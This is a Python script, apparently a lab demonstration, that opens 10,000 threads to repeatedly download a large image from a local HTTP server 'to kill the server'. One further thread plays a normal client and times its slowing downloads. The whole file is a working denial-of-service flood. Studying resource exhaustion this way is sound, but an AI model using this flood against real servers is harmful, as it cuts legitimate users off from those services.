import socket
from threading import Thread
from timeit import default_timer as timer
from time import sleep

THREAD_COUNT = 10_000
SERVER_IP = "127.0.0.1"
SERVER_PORT = 8080
IMAGE = "Fronalpstock_big.jpg"
GET = f"GET /{IMAGE} HTTP/1.1\r\n\r\n"

def download():
    response = b''
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        request = GET.encode()
        s.connect((SERVER_IP, SERVER_PORT))
        s.sendall(request)        

        while True:
            data = s.recv(1024)
            if not data:
                break
            response += data
        s.close()


def normal_client():
    """
    Simulating a normal client browsing the server regularly
    This should fail after a while once the other threads are running
    """
    while True:
        start = timer()
        download()
        end = timer()
        ms = (end - start) * 1000
        print("Regular client downloaded image in: {:.2f}ms.".format(ms))
        sleep(1)


def thread_function():
    while True:
        download()


if __name__ == "__main__":
    print("Starting normal client that will download the image once every second")
    regular_client = Thread(target=normal_client)
    regular_client.start()

    sleep(5)
    print(f"Creating {THREAD_COUNT} threads to kill the server...")

    threads = []
    for i in range(THREAD_COUNT):
        t = Thread(target=thread_function)
        t.start()
        threads.append(t)

    print(f"{THREAD_COUNT} threads are running...")
